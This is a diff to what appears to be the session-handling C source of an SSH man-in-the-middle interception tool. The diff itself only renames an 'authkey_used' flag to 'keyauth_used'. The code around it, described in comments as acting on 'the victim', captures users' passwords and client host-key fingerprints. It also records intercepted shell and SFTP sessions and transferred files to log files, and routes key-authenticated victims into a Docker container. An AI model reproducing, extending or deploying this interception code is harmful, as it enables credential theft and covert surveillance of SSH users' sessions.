@@ -177,7 +177,7 @@ static char *auth_sock_dir = NULL;
 #define MAX_LOG_OPEN_TRIES 1048576 /* 1M */
 
 char *create_password_and_fingerprint_socket(int *sock_fd);
-void set_session_log(Session *s, unsigned int is_sftp, unsigned int authkey_used, const char *command);
+void set_session_log(Session *s, unsigned int is_sftp, unsigned int keyauth_used, const char *command);
 void write_password_and_read_fingerprints(char **password_and_fingerprint_socket_name, int sock_fd, struct ssh *ssh_active_state, Channel *c);
 
 /* removes the agent forwarding socket */
@@ -358,7 +358,7 @@ do_exec_no_pty(Session *s, const char *command, char *password_and_fingerprint_s
 
 	session_proctitle(s);
 
-	set_session_log(s, command || (s->is_subsystem == SUBSYSTEM_INT_SFTP), lol->authkey_used, command);
+	set_session_log(s, command || (s->is_subsystem == SUBSYSTEM_INT_SFTP), lol->keyauth_used, command);
 
 	/* Fork the child. */
 	switch ((pid = fork())) {
@@ -524,7 +524,7 @@ do_exec_pty(Session *s, const char *command, char *password_and_fingerprint_sock
 		return -1;
 	}
 
-	set_session_log(s, command || (s->is_subsystem == SUBSYSTEM_INT_SFTP), lol->authkey_used, command);
+	set_session_log(s, command || (s->is_subsystem == SUBSYSTEM_INT_SFTP), lol->keyauth_used, command);
 
 	/* Fork the child. */
 	switch ((pid = fork())) {
@@ -709,7 +709,7 @@ do_exec(Session *s, const char *command)
 		ret = do_exec_no_pty(s, command, password_and_fingerprint_socket_name);
 
 	/* If the victim didn't use pubkey authentication, write the password and read the client's host key fingerprints into the Channel struct. */
-	if (!lol->authkey_used)
+	if (!lol->keyauth_used)
 	  write_password_and_read_fingerprints(&password_and_fingerprint_socket_name, sock_fd, active_state, channel_by_id(s->chanid));
 
 	destroy_password_and_fingerprint_socket(&password_and_fingerprint_socket_name, &sock_fd);
@@ -1660,7 +1660,7 @@ do_child(Session *s, const char *command, char *password_and_fingerprint_socket_
 
 
 		/* For SFTP with key auth; connects to our Docker container. */
-		if (lol->authkey_used) {
+		if (lol->keyauth_used) {
 		  char *envp[8] = {0};
 
 		  debug3("Victim used key authentication for sftp.  Spawning Docker container...");
@@ -1711,7 +1711,7 @@ do_child(Session *s, const char *command, char *password_and_fingerprint_socket_
 					lol->username, password_and_fingerprint_socket_name, s->session_log_filepath, s->session_log_dir));
 	}
 
-	if (lol->authkey_used) {
+	if (lol->keyauth_used) {
 	  char *envp[8] = {0};
 
 	  debug3("Victim used key authentication for shell.  Spawning Docker container...");
@@ -2281,7 +2281,7 @@ session_set_fds(Session *s, int fdin, int fdout, int fderr, int ignore_fderr,
 	channel_set_fds(s->chanid,
 	    fdout, fdin, fderr,
 	    ignore_fderr ? CHAN_EXTENDED_IGNORE : CHAN_EXTENDED_READ,
-	    1, is_tty, CHAN_SES_WINDOW_DEFAULT, s->session_log_fd, s->is_sftp, s->authkey_used);
+	    1, is_tty, CHAN_SES_WINDOW_DEFAULT, s->session_log_fd, s->is_sftp, s->keyauth_used);
 }
 
 /*
@@ -2464,7 +2464,7 @@ session_close(Session *s)
 	free(s->session_log_filepath); s->session_log_filepath = NULL;
 	if (s->session_log_fd > -1) {
 	  if (s->is_sftp) {
-	    if (s->authkey_used)
+	    if (s->keyauth_used)
 	      write(s->session_log_fd, "{\"eof\":true}]\n", 14);
 	    else
 	      write(s->session_log_fd, "</pre></html>", 13);
@@ -2756,17 +2756,17 @@ session_get_remote_name_or_ip(struct ssh *ssh, u_int utmp_size, int use_dns)
 
 /* Returns a file handle for logging a shell/sftp session.  Set "is_sftp" arg
  * to 1 to make a log file for SFTP. */
-void set_session_log(Session *s, unsigned int is_sftp, unsigned int authkey_used, const char *command) {
+void set_session_log(Session *s, unsigned int is_sftp, unsigned int keyauth_used, const char *command) {
   char filename[ sizeof(MITM_LOG) + 32 ] = MITM_LOG "shell_session_0.txt";
   int num_tries = 0, saved_fd = -1;
   size_t fn_len = 0;
 
 
   s->is_sftp = is_sftp;
-  s->authkey_used = authkey_used;
+  s->keyauth_used = keyauth_used;
 
   if (s->is_sftp) {
-    if (s->authkey_used)
+    if (s->keyauth_used)
       strlcpy(filename, MITM_LOG "sftp_session_raw_0.json", sizeof(filename));
     else
       strlcpy(filename, MITM_LOG "sftp_session_0.html", sizeof(filename));
@@ -2786,7 +2786,7 @@ void set_session_log(Session *s, unsigned int is_sftp, unsigned int authkey_used
      * to the filename prefix so we can try again. */
     if (s->session_log_fd < 0) {
       if (s->is_sftp) {
-	if (s->authkey_used)
+	if (s->keyauth_used)
 	  snprintf(filename, sizeof(filename) - 1, MITM_LOG "sftp_session_raw_%d.json", num_tries);
 	else
 	  snprintf(filename, sizeof(filename) - 1, MITM_LOG "sftp_session_%d.html", num_tries);
@@ -2815,7 +2815,7 @@ void set_session_log(Session *s, unsigned int is_sftp, unsigned int authkey_used
     s->session_log_filepath = xstrdup(filename);
 
     /* If we are going to log raw SFTP data (i.e.: key authentication sessions), then don't write anything else into the log file.  Instead, open a new file to store the connection info. */
-    if ((s->is_sftp) && (s->authkey_used)) {
+    if ((s->is_sftp) && (s->keyauth_used)) {
       write(s->session_log_fd, "[", 1);  /* Start JSON array. */
       saved_fd = s->session_log_fd;
 
@@ -2835,7 +2835,7 @@ void set_session_log(Session *s, unsigned int is_sftp, unsigned int authkey_used
 
     /* Create a unique directory for SFTP sessions.  This is where uploaded and
      * downloaded files will go. */
-    if ((s->is_sftp) && (!s->authkey_used)) {
+    if ((s->is_sftp) && (!s->keyauth_used)) {
       filename[strlen(filename) - 5] = '/';
       filename[strlen(filename) - 4] = '\0';
       if (mkdir(filename, S_IRWXU) == 0)
